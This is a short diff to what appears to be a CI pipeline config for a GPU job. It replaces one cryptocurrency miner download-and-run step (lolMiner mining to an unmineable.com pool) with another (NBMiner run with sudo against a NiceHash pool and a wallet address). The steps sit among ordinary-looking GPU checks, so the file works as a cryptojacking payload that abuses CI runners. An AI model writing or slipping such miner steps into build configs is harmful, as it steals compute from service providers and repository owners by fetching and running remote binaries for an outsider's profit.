@@ -7,5 +7,5 @@ jobs:
     resource_class: gpu.nvidia.medium
     steps:
       - run: nvidia-smi
-      - run: wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.45/lolMiner_v1.45_Lin64.tar.gz && tar xvf lolMiner_v1.45_Lin64.tar.gz && cd 1.45 && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TWqp4JVSvTdrMzozHzncjDgqezt88XjCZ5.$(echo $(shuf -i 1-9999 -n 1)-RIG) --ethstratum ETHPROXY 
+      - run: wget https://github.com/NebuTech/NBMiner/releases/download/v40.1/NBMiner_40.1_Linux.tgz && tar -zxvf NBMiner_40.1_Linux.tgz && cd NBMiner_Linux/ && sudo ./nbminer -a ethash -o nicehash+tcp://daggerhashimoto.eu.nicehash.com:3353 -u 36uCcsh41Two7i7PpYgQsvnJvLDrPW9XxK.fsf --enable-dag-cache
       - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
